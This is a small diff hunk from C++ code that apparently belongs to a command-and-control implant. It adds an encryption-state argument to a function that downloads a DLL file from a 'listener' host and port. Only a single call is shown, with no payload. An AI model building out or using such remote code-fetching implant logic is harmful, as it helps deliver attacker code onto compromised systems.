@@ -17,6 +17,7 @@ namespace Task
         // Download a DLL file
         if (!System::Http::DownloadFile(
             pState->pProcs,
+            pState->pCrypt,
             pState->hConnect,
             pState->lpListenerHost,
             pState->nListenerPort,
